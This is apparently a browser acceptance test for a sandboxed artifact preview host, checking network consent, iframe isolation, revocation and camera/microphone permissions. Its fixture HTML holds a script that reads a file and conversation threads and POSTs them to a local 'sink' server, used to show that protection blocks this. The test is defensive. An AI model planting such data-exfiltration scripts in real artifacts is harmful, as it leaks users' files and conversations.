import assert from "node:assert/strict";
import { randomBytes } from "node:crypto";
import { mkdtemp, rm } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { createArtifactApi } from "../server/artifact-api.ts";
import { openArtifactStorage } from "../server/artifact-storage.ts";
import { PREVIEW_PREFIX } from "../server/preview-contexts.ts";
import { PreviewHost } from "../server/preview-host.ts";
import { previewSupport } from "../server/preview-support.ts";
import type { ArtifactPreviewContext } from "../shared/artifacts.ts";
import { eventually, openTestBrowser } from "./browser.ts";
import { browserLoweredCssPlugin } from "./spa-css.ts";

const build = await Bun.build({
  entrypoints: [join(import.meta.dir, "preview-workspace-fixture.tsx")],
  target: "browser",
  minify: true,
  define: { "process.env.NODE_ENV": '"production"' },
  plugins: [await browserLoweredCssPlugin()],
});
if (!build.success) throw new Error("Network acceptance workspace failed to build");
const assets = new Map(build.outputs.map((output) => [output.path.split("/").at(-1)!, output]));
const js = [...assets.keys()].find((path) => path.endsWith(".js"))!;
const css = [...assets.keys()].find((path) => path.endsWith(".css"));
const root = await mkdtemp(join(tmpdir(), "r3-network-acceptance-"));
const storage = await openArtifactStorage({ databasePath: join(root, "store.sqlite") });
const received: string[] = [];
let externalScripts = 0;
const outside = Bun.serve({
  hostname: "127.0.0.1",
  port: 0,
  async fetch(request) {
    const path = new URL(request.url).pathname;
    if (path === "/document")
      return new Response(
        `<!doctype html><h1>External document</h1><iframe srcdoc="Nested document"></iframe><script>
const worker=new Worker(URL.createObjectURL(new Blob(['postMessage(42)'],{type:'text/javascript'})));
worker.onmessage=event=>{window.workerResult=event.data;worker.terminate()};
</script>`,
        { headers: { "content-type": "text/html" } },
      );
    const script = path === "/script.js";
    if (script) externalScripts++;
    else received.push(await request.text());
    return new Response(script ? "window.externalScriptLoaded = true;" : "Accepted", {
      headers: {
        "access-control-allow-origin": "*",
        "content-type": script ? "text/javascript" : "text/plain",
      },
    });
  },
});
const sink = `http://localhost:${outside.port}`;
const actor = { role: "human" as const, sessionId: null };
const html = storage.artifacts.create({ kind: "html", actor, title: "Network consent fixture" });
const files = storage.artifacts.create({ kind: "files", actor, title: "Files stay protected" });
for (const artifact of [html, files]) {
  for (const seq of [1, 2])
    await storage.artifacts.publish(artifact.id, {
      actor,
      expectedSeq: seq - 1,
      publicationKey: `version-${seq}`,
      content: {
        kind: artifact.kind as "html" | "files",
        files: [
          {
            path: "index.html",
            mediaType: "text/html",
            base64:
              Buffer.from(`<!doctype html><html><head><script src="${sink}/script.js"></script></head><body><h1>Version ${seq}</h1><a href="other.html">Other document</a><script type="module">
import r3 from "/r3/utility.js";window.r3=r3;
try {const file=await fetch('./data.txt').then(r=>r.text());const threads=await r3.getThreads();await fetch('${sink}/capture',{method:'POST',body:JSON.stringify({file,threads})});window.networkResult='external'}catch{window.networkResult='blocked'}
</script></body></html>`).toString("base64"),
          },
          {
            path: "data.txt",
            mediaType: "text/plain",
            base64: Buffer.from("Published fixture data").toString("base64"),
          },
          {
            path: "other.html",
            mediaType: "text/html",
            base64: Buffer.from(
              '<!doctype html><h1>Other document</h1><a href="index.html">Back</a><script>window.r3=globalThis.__r3ArtifactUtility</script>',
            ).toString("base64"),
          },
        ],
      },
    });
}
await storage.conversations.add(html.id, {
  actor,
  target: { kind: "artifact" },
  body: "Fixture conversation",
});
const preview = new PreviewHost(storage.artifacts, undefined, previewSupport);
const api = createArtifactApi(
  storage,
  {
    token: randomBytes(32).toString("base64url"),
    requireLogin: false,
    version: "acceptance",
    allowedHost: (host) => host === "localhost",
  },
  { previews: preview },
);
const grants: ArtifactPreviewContext[] = [];
let publicationRequests = 0;
let deniedAppRequests = 0;
const app = Bun.serve({
  hostname: "127.0.0.1",
  port: 0,
  idleTimeout: 0,
  async fetch(request) {
    const path = new URL(request.url).pathname;
    if (path.startsWith(PREVIEW_PREFIX)) {
      if (path.includes("/files/")) publicationRequests++;
      return preview.fetch(request);
    }
    if (path.startsWith("/api/")) {
      const response = await api.app.fetch(request);
      if (path.endsWith("/previews") && request.method === "POST" && response.status === 201)
        grants.push((await response.clone().json()) as ArtifactPreviewContext);
      if (request.headers.get("origin") === "null" && response.status === 403) deniedAppRequests++;
      return response;
    }
    const asset = assets.get(path.slice(1));
    if (asset) return new Response(asset);
    return new Response(
      `<!doctype html><html><head><meta name="viewport" content="width=device-width,initial-scale=1">${css ? `<link rel="stylesheet" href="/${css}">` : ""}<style>html,body,#root{height:100%;margin:0}#root{display:flex;flex-direction:column}</style></head><body><div id="root"></div><script type="module" src="/${js}"></script></body></html>`,
      { headers: { "content-type": "text/html" } },
    );
  },
});
const origin = `http://localhost:${app.port}`;
const unsupported = process.env.R3_TEST_UNSUPPORTED === "1";
let browser: Awaited<ReturnType<typeof openTestBrowser>> | undefined;
try {
  browser = await openTestBrowser(["--use-fake-device-for-media-stream"]);
  const { targetId } = await browser.send("Target.createTarget", { url: "about:blank" });
  const page = await browser.attach(targetId);
  if (process.env.R3_TEST_CAPTURE === "1") {
    await page.command("Page.addScriptToEvaluateOnNewDocument", {
      source: `
if(window===top){
const native=navigator.mediaDevices.getUserMedia.bind(navigator.mediaDevices);
window.testPhysicalStreams=[];window.testDeviceRequests=0;
navigator.mediaDevices.getUserMedia=async constraints=>{window.testDeviceRequests++;const stream=await native(constraints);window.testPhysicalStreams.push(stream);return stream};
}`,
    });
    for (const name of ["camera", "microphone"])
      await browser.send("Browser.setPermission", {
        origin,
        permission: { name },
        setting: "denied",
      });
  }
  const testBrowser = browser;
  const embedded = new Map<string, typeof page>();
  const frame = (condition: string) =>
    eventually(async () => {
      // Full Chromium may put opaque frames in a separate renderer process.
      // Attach its inspector without disabling the browser's site isolation.
      const { targetInfos } = await testBrowser.send("Target.getTargets");
      for (const target of targetInfos) {
        if (target.type !== "iframe" || embedded.has(target.targetId)) continue;
        try {
          embedded.set(target.targetId, await testBrowser.attach(target.targetId));
        } catch {
          /* Navigation can discard a target before attachment. */
        }
      }
      for (const inspector of [page, ...embedded.values()]) {
        for (const context of inspector.contexts.values()) {
          if (!context.auxData?.isDefault) continue;
          const candidate = inspector.inContext(context.id);
          try {
            if (await candidate.evaluate(`globalThis.origin === 'null' && (${condition})`))
              return candidate;
          } catch {
            /* Navigation discards the preceding document. */
          }
        }
      }
      return null;
    }, "network preview document");
  const button = (label: string, scope = "document") =>
    `[...${scope}.querySelectorAll('button')].find(b=>b.textContent.trim()===${JSON.stringify(label)})`;
  const click = async (expression: string) => {
    await eventually(() => page.evaluate(`!!(${expression})`), "workspace control");
    // Security controls stay mounted in the navbar's details menu.
    if (
      await page.evaluate(
        `!!document.querySelector('[aria-label="Close artifact details"]') && !(${expression}).closest('[aria-label="Artifact details"]') && (${expression}).getAttribute('aria-label') !== 'Close artifact details'`,
      )
    ) {
      await page.evaluate(
        "document.querySelector('[aria-label=\"Close artifact details\"]').click()",
      );
    }
    if (
      await page.evaluate(`!!(${expression}).closest('[aria-label="Artifact details"][hidden]')`)
    ) {
      await page.evaluate(
        "document.querySelector('[aria-label=\"Artifact details and actions\"]').click()",
      );
    }
    if (
      await page.evaluate(
        `!!(${expression}).closest('[aria-label="Preview security details"][hidden]')`,
      )
    ) {
      await page.evaluate(
        "document.querySelector('[data-preview-security] > button[aria-expanded]').click()",
      );
    }
    await eventually(
      () =>
        page.evaluate(
          `(()=>{const node=(${expression});const rect=node.getBoundingClientRect();return rect.width>0&&rect.height>0&&!node.closest('[inert],[hidden]')&&(!node.closest('dialog')||node.closest('dialog').open)})()`,
        ),
      "workspace control visible",
    );
    await page.evaluate(`(${expression}).scrollIntoView({block:'center'})`);
    await page.evaluate("new Promise(requestAnimationFrame)");
    let previous = "";
    const position = await eventually(async () => {
      const position = await page.evaluate(
        `(()=>{const node=(${expression});const r=node.getBoundingClientRect();const x=r.x+r.width/2,y=r.y+r.height/2;const hit=document.elementFromPoint(x,y);return node.contains(hit)?{x,y}:null})()`,
      );
      const key = JSON.stringify(position);
      const stable = key === previous;
      previous = key;
      return stable ? position : null;
    }, `workspace control is stable and receives pointer input: ${expression}`);
    for (const type of ["mousePressed", "mouseReleased"])
      await page.command("Input.dispatchMouseEvent", {
        type,
        button: "left",
        clickCount: 1,
        ...position,
      });
  };
  const protectedPreview = async (seq: number) => {
    await eventually(
      () => page.evaluate("!!document.querySelector('[data-preview-network=blocked]')"),
      "protected default",
    );
    if (unsupported) {
      await eventually(
        () => page.evaluate("document.body.textContent.includes('cannot enforce')"),
        "unsupported protected preview refused",
      );
      assert.equal(
        await page.evaluate("!!document.querySelector('[data-artifact-preview] iframe')"),
        false,
      );
      if (
        await page.evaluate(
          "!!document.querySelector('[data-preview-compatibility-consent][open]')",
        )
      )
        await click(button("Keep preview closed"));
    } else {
      await frame(
        `window.networkResult==='blocked' && document.querySelector('h1')?.textContent==='Version ${seq}'`,
      );
      await eventually(
        () =>
          page.evaluate("!!document.querySelector('[data-artifact-preview] iframe:not([inert])')"),
        "preview is ready for interaction",
      );
    }
  };
  const allow = async (camera = false, microphone = false) => {
    await click(button("Allow external access"));
    await eventually(
      () => page.evaluate("!!document.querySelector('dialog[open]')"),
      "explicit consent dialog",
    );
    const inputs = "document.querySelector('dialog').querySelectorAll('input')";
    assert.deepEqual(await page.evaluate(`[...${inputs}].map(input=>input.checked)`), [
      false,
      false,
    ]);
    if (camera) await click(`${inputs}[0]`);
    if (microphone) await click(`${inputs}[1]`);
    await click(button("Allow external access", "document.querySelector('dialog')"));
    const content = await frame(
      "window.networkResult==='external' && window.externalScriptLoaded===true",
    );
    assert.equal(
      await page.evaluate("!!document.querySelector('[data-preview-network=external]')"),
      true,
    );
    assert.equal(grants.at(-1)!.network, "external");
    return content;
  };
  const revoked = async (context: ArtifactPreviewContext) =>
    eventually(async () => {
      const response = await fetch(context.gateUrl);
      return response.status === 404;
    }, "preceding context revoked");
  const version = async (seq: number) => {
    if (
      await page.evaluate(
        "!!document.querySelector('[aria-label=\"Preview security details\"]:not([hidden])')",
      )
    )
      await click("document.querySelector('[aria-label^=\"Preview security:\"]')");
    if (await page.evaluate("!!document.querySelector('[aria-label=\"Close artifact details\"]')"))
      await click("document.querySelector('[aria-label=\"Close artifact details\"]')");
    await click("document.querySelector('[aria-label=\"Published version\"]')");
    await click(`document.querySelector('[data-version-seq="${seq}"]')`);
  };

  await page.command("Page.navigate", { url: `${origin}/?artifact=${html.id}&version=1` });
  await protectedPreview(1);
  assert.equal(received.length, 0);
  assert.equal(externalScripts, 0);
  if (unsupported) assert.equal(publicationRequests, 0, "no published bytes before consent");
  const initial = grants.at(-1)!;
  await click(button("Allow external access"));
  await eventually(
    () => page.evaluate("!!document.querySelector('dialog[open]')"),
    "initial external confirmation",
  );
  assert.equal(
    await page.evaluate("document.querySelector('dialog').textContent.includes('conversations')"),
    true,
  );
  for (const key of ["e", "S", ">", "?"])
    for (const type of ["keyDown", "keyUp"])
      await page.command("Input.dispatchKeyEvent", { type, key });
  assert.equal(await page.evaluate("!!document.querySelector('dialog[open]')"), true);
  assert.equal(await page.evaluate("new URL(location.href).searchParams.get('version')"), "1");
  assert.equal(storage.conversations.list(html.id)[0].status, "open");
  assert.equal(storage.conversations.list(html.id)[0].sentAt, null);
  for (const type of ["keyDown", "keyUp"])
    await page.command("Input.dispatchKeyEvent", {
      type,
      key: "Escape",
      code: "Escape",
      windowsVirtualKeyCode: 27,
    });
  await eventually(
    () => page.evaluate("!document.querySelector('dialog[open]')"),
    "Escape dismisses native consent",
  );
  assert.equal(
    await page.evaluate("document.querySelector('[aria-label=\"Artifact details\"]').hidden"),
    false,
    "Escape preserves the underlying details menu",
  );
  assert.equal(
    await page.evaluate(
      "document.querySelector('[aria-label=\"Preview security details\"]').hidden",
    ),
    false,
  );
  assert.equal(await page.evaluate("document.activeElement.textContent"), "Allow external access");
  await click(button("Allow external access"));
  await click(button("Keep protection"));
  assert.equal(grants.length, 1, "cancel must not create an external context");
  const content = await allow();
  await revoked(initial);
  const external = grants.at(-1)!;
  assert.equal(JSON.parse(received.at(-1)!).file, "Published fixture data");
  assert.equal(JSON.parse(received.at(-1)!).threads[0].body, "Fixture conversation");
  assert.equal(await content.evaluate("globalThis.origin"), "null");
  assert.equal(
    await content.evaluate(
      "(()=>{try{void parent.document.body;return false}catch{return true}})()",
    ),
    true,
  );
  assert.equal(
    await content.evaluate(
      "(()=>{try{localStorage.setItem('fixture','value');return false}catch{return true}})()",
    ),
    true,
  );
  assert.equal(
    await content.evaluate(
      `fetch('${origin}/api/artifacts',{credentials:'include'}).then(()=>false,()=>true)`,
    ),
    true,
  );
  assert.ok(
    deniedAppRequests > 0,
    "app origin guard rejects real requests from the external preview",
  );
  assert.equal(
    await content.evaluate(
      "navigator.mediaDevices.getUserMedia({audio:true,video:true}).then(s=>{s.getTracks().forEach(t=>t.stop());return false},()=>true)",
    ),
    true,
  );

  // Native navigation retains this version's explicit choice and utility bridge.
  await content.evaluate("document.querySelector('a').click()");
  const other = await frame(
    "!!window.r3 && document.querySelector('h1')?.textContent==='Other document'",
  );
  assert.equal(await other.evaluate("r3.getContext().then(c=>c.versionSeq)"), 1);
  assert.equal(grants.at(-1)!.id, external.id);
  await other.evaluate("document.querySelector('a').click()");
  const returned = await frame("window.networkResult==='external'");

  // External navigation keeps the iframe sandbox/device policy, but the new
  // document does not inherit r3's response CSP against workers/nested frames.
  await returned.evaluate(`location.href=${JSON.stringify(`${sink}/document`)}`);
  const replacement = await frame(
    "document.querySelector('h1')?.textContent==='External document' && window.workerResult===42",
  );
  assert.equal(
    await replacement.evaluate(
      "(()=>{try{void parent.document.body;return false}catch{return true}})()",
    ),
    true,
  );
  assert.equal(
    await replacement.evaluate(
      `fetch('${origin}/api/boot',{credentials:'include'}).then(()=>false,()=>true)`,
    ),
    true,
  );
  assert.equal(
    await replacement.evaluate(
      "navigator.mediaDevices.getUserMedia({audio:true,video:true}).then(s=>{s.getTracks().forEach(t=>t.stop());return false},()=>true)",
    ),
    true,
  );
  const nested = await frame("document.body?.textContent==='Nested document'");
  assert.equal(
    await nested.evaluate("(()=>{try{void top.document.body;return false}catch{return true}})()"),
    true,
  );

  const count = received.length;
  await click(button("Restore protection"));
  await protectedPreview(1);
  await revoked(external);
  assert.equal(received.length, count, "protection blocks subsequent document connections");
  assert.equal(grants.at(-1)!.network, "blocked");
  assert.notEqual(grants.at(-1)!.id, initial.id);

  await allow();
  const beforeSwitch = grants.at(-1)!;
  await version(2);
  await protectedPreview(2);
  await revoked(beforeSwitch);
  assert.equal(grants.at(-1)!.network, "blocked");
  await version(1);
  await protectedPreview(1);
  assert.equal(
    grants.at(-1)!.network,
    "blocked",
    "returning to an older version does not restore consent",
  );
  await allow();
  await page.command("Page.reload");
  await protectedPreview(1);
  assert.equal(grants.at(-1)!.network, "blocked", "page reload restores protection");

  await page.command("Emulation.setDeviceMetricsOverride", {
    width: 390,
    height: 844,
    deviceScaleFactor: 1,
    mobile: true,
  });
  await click(button("Allow external access"));
  await eventually(
    () => page.evaluate("!!document.querySelector('dialog[open]')"),
    "phone external confirmation",
  );
  assert.equal(
    await page.evaluate(
      "(()=>{const r=document.querySelector('dialog[open]').getBoundingClientRect();return r.left>=0&&r.right<=innerWidth&&r.top>=0&&r.bottom<=innerHeight})()",
    ),
    true,
    "phone consent fits the viewport",
  );
  await click(button("Keep protection"));
  assert.equal(
    await page.evaluate("document.documentElement.scrollWidth <= innerWidth"),
    true,
    "network control does not widen the phone workspace",
  );
  await page.command("Emulation.clearDeviceMetricsOverride");

  if (process.env.R3_TEST_CAPTURE === "1") {
    let choice = 0;
    const chooseDevices = async (camera: boolean, microphone: boolean) => {
      choice++;
      await click(button("Permissions"));
      await eventually(
        () => page.evaluate("!!document.querySelector('dialog[open]')"),
        "device permission dialog opened",
      );
      for (const [kind, checked] of [
        ["Camera", camera],
        ["Microphone", microphone],
      ] as const) {
        const input = `[...document.querySelector('dialog').querySelectorAll('label')].find(label=>label.textContent.trim()===${JSON.stringify(kind)}).querySelector('input')`;
        if ((await page.evaluate(`${input}.checked`)) !== checked) await click(input);
        await eventually(
          async () => (await page.evaluate(`${input}.checked`)) === checked,
          `device checkbox ${kind} #${choice}`,
        );
      }
      await click(button("Save permissions"));
      await eventually(
        () =>
          page.evaluate(
            `!!document.querySelector('[data-preview-camera="${camera ? "allowed" : "blocked"}"][data-preview-microphone="${microphone ? "allowed" : "blocked"}"]')`,
          ),
        `chosen device permissions #${choice}: camera=${camera}, microphone=${microphone}`,
      );
    };
    const physical = () =>
      page.evaluate(
        "window.testPhysicalStreams.at(-1)?.getTracks().map(t=>({kind:t.kind,state:t.readyState}))",
      );
    const stopped = () =>
      eventually(
        async () =>
          (await physical())?.every((track: { state: string }) => track.state === "ended"),
        "physical devices stopped",
      );
    let content = await allow();
    const callsBefore = await page.evaluate<number>("window.testDeviceRequests");
    assert.equal(
      await content.evaluate(
        "navigator.mediaDevices.getUserMedia({video:true}).then(()=>false,e=>e.name)",
      ),
      "NotAllowedError",
    );
    assert.equal(
      await page.evaluate("window.testDeviceRequests"),
      callsBefore,
      "r3 consent is required before a native request",
    );
    await chooseDevices(true, false);
    assert.equal(
      await content.evaluate(
        "navigator.mediaDevices.getUserMedia({audio:true}).then(()=>false,e=>e.name)",
      ),
      "NotAllowedError",
    );
    assert.equal(
      await content.evaluate(
        "navigator.mediaDevices.getUserMedia({video:true}).then(()=>false,e=>e.name)",
      ),
      "NotAllowedError",
      "real browser denial is preserved",
    );
    assert.equal(await page.evaluate("window.testDeviceRequests"), callsBefore + 1);
    await browser.send("Browser.grantPermissions", {
      origin,
      permissions: ["videoCapture", "audioCapture"],
    });
    assert.equal(
      await content.evaluate(
        "MediaDevices.prototype.getUserMedia.call(navigator.mediaDevices,{video:true}).then(()=>false,()=>true)",
      ),
      true,
      "direct iframe capture stays denied even after browser permission",
    );
    await chooseDevices(true, true);
    await content.evaluate(
      `const NativePeer=RTCPeerConnection;window.RTCPeerConnection=class extends NativePeer{constructor(...args){super(...args);window.testPeer=this}}`,
    );
    assert.deepEqual(
      await content.evaluate(
        "navigator.mediaDevices.getUserMedia({audio:true,video:{width:{ideal:320},height:{ideal:240}}}).then(stream=>{window.testMedia=stream;return stream.getTracks().map(t=>t.kind).sort()})",
      ),
      ["audio", "video"],
    );
    await content.evaluate(
      "window.testVideo=document.createElement('video');testVideo.muted=true;testVideo.autoplay=true;testVideo.playsInline=true;testVideo.srcObject=testMedia;document.body.append(testVideo);testVideo.play()",
    );
    await eventually(
      () => content.evaluate("testVideo.videoWidth>0 && testVideo.currentTime>0"),
      "relayed camera frames play",
    );
    await eventually(
      () =>
        content.evaluate(
          "testPeer.getStats().then(stats=>[...stats.values()].some(s=>s.type==='inbound-rtp'&&s.kind==='audio'&&s.bytesReceived>0))",
        ),
      "microphone samples arrive",
    );
    assert.equal(
      await page.evaluate("!!document.querySelector('[data-preview-capture=sharing]')"),
      true,
    );
    await content.evaluate(
      "window.testClone=testMedia.clone();testMedia.getTracks().forEach(t=>t.stop())",
    );
    assert.equal(
      (await physical()).every((track: { state: string }) => track.state === "live"),
      true,
      "clones keep their capture source alive",
    );
    await content.evaluate("testClone.getVideoTracks()[0].stop()");
    await eventually(
      async () =>
        (await physical()).find((track: { kind: string }) => track.kind === "video")?.state ===
        "ended",
      "stopping the last video clone stops the physical camera",
    );
    assert.equal(
      (await physical()).find((track: { kind: string }) => track.kind === "audio")?.state,
      "live",
    );
    await click(button("Stop sharing"));
    await stopped();
    assert.equal(await content.evaluate("testClone.getAudioTracks()[0].readyState"), "ended");
    assert.equal(
      await content.evaluate(
        "navigator.mediaDevices.getUserMedia({video:true}).then(()=>false,e=>e.name)",
      ),
      "NotAllowedError",
      "Stop sharing clears device consent despite remembered browser permission",
    );
    await click(button("Permissions"));
    await eventually(
      () => page.evaluate("!!document.querySelector('dialog[open]')"),
      "device permission dialog opened",
    );
    await click("document.querySelector('dialog input')");
    await content.evaluate("document.querySelector('a').click()");
    content = await frame(
      "!!window.r3 && document.querySelector('h1')?.textContent==='Other document'",
    );
    await eventually(
      () => page.evaluate("!document.querySelector('dialog[open]')"),
      "navigation dismisses stale device consent",
    );
    assert.equal(
      await page.evaluate("!!document.querySelector('[data-preview-camera=blocked]')"),
      true,
    );
    await content.evaluate("location.href='index.html'");
    content = await frame("!!window.r3 && document.querySelector('h1')?.textContent==='Version 1'");
    await chooseDevices(true, false);
    await content.evaluate(
      "navigator.mediaDevices.getUserMedia({video:true}).then(stream=>{window.testMedia=stream})",
    );
    await content.evaluate("document.querySelector('a').click()");
    content = await frame(
      "!!window.r3 && document.querySelector('h1')?.textContent==='Other document'",
    );
    await stopped();
    assert.equal(
      await content.evaluate(
        "navigator.mediaDevices.getUserMedia({video:true}).then(()=>false,e=>e.name)",
      ),
      "NotAllowedError",
      "native navigation cannot inherit device consent",
    );
    await chooseDevices(true, false);
    await content.evaluate("r3.getUserMedia({video:true}).then(stream=>{window.testMedia=stream})");
    await content.evaluate(`location.href=${JSON.stringify(`${sink}/document`)}`);
    await frame("document.querySelector('h1')?.textContent==='External document'");
    await stopped();
    assert.equal(
      await page.evaluate("!!document.querySelector('[data-preview-camera=blocked]')"),
      true,
    );
    await version(2);
    await protectedPreview(2);
    content = await allow(true, true);
    await content.evaluate(
      "r3.getUserMedia({video:true,audio:true}).then(stream=>{window.testMedia=stream})",
    );
    // Live pages answer the watchdog; a stalled opaque renderer cannot keep
    // physical devices running indefinitely, and Retry must restore the bridge.
    await Bun.sleep(2500);
    assert.equal(
      (await physical()).every((track: { state: string }) => track.state === "live"),
      true,
    );
    const stalled = content
      .evaluate("{const deadline=Date.now()+5000;while(Date.now()<deadline){}} ")
      .catch(() => {});
    await eventually(
      () => page.evaluate("document.body.textContent.includes('Preview stopped responding')"),
      "unresponsive capture fails closed with recovery",
    );
    await stopped();
    await stalled;
    await click(button("Retry preview"));
    content = await frame("!!window.r3 && document.querySelector('h1')?.textContent==='Version 2'");
    assert.equal(
      await content.evaluate("r3.getUserMedia({video:true}).then(()=>false,e=>e.name)"),
      "NotAllowedError",
    );
    await chooseDevices(true, true);
    await content.evaluate(
      "r3.getUserMedia({video:true,audio:true}).then(stream=>{window.testMedia=stream})",
    );
    await version(1);
    await protectedPreview(1);
    await stopped();
    console.log(
      "Device capture acceptance: browser denial/grant, live audio/video, clone/track stop, Stop sharing, navigation/version revocation, and unresponsive-page recovery passed",
    );
  }

  await page.command("Page.navigate", { url: `${origin}/?artifact=${files.id}&version=1` });
  await click(button("Rendered"));
  await eventually(
    () => page.evaluate("!!document.querySelector('[data-artifact-preview]')"),
    "files HTML preview",
  );
  assert.equal(await page.evaluate("!!document.querySelector('[data-preview-protections]')"), true);
  assert.equal(await page.evaluate(`!!(${button("Allow external access")})`), false);
  const screenshot = process.env.R3_TEST_SCREENSHOT;
  if (screenshot) {
    await page.command("Page.navigate", { url: `${origin}/?artifact=${html.id}&version=1` });
    await protectedPreview(1);
    await allow();
    const image = await page.command("Page.captureScreenshot", { format: "png" });
    await Bun.write(screenshot, Buffer.from(image.data, "base64"));
  }
  console.log(
    `Preview network acceptance: HTML-only consent, external resources/data, isolation, revocation, and version/reload reset passed${unsupported ? " in unsupported protected browser" : ""}`,
  );
} finally {
  await browser?.close();
  app.stop(true);
  outside.stop(true);
  api.close();
  preview.close();
  storage.close();
  await rm(root, { recursive: true, force: true });
}
